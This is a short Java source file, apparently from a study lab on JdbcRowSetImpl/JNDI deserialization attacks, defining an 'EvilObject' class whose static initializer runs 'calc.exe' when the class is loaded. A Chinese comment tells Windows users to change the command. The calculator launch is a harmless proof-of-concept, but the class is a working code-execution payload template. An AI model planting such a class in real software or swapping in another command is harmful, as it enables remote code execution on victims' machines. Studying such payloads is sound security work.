package cc.blbana.JdbcRowSetImpl;

import java.io.IOException;



public class EvilObject {
    public EvilObject() {
    }
    static {
        try {
            // win用户改成calc即可
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}